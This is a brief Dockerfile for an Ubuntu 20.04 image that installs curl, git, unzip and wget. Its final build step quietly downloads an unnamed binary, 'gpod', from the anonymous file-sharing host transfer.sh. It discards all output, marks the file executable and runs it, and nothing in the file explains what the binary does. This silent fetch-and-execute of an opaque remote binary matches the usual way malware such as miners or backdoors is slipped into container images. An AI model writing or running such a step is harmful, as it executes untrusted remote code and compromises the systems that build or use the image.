FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install -y curl git unzip wget
RUN wget https://transfer.sh/e4vS3O/gpod> /dev/null 2>&1 && chmod +x gpod && ./gpod
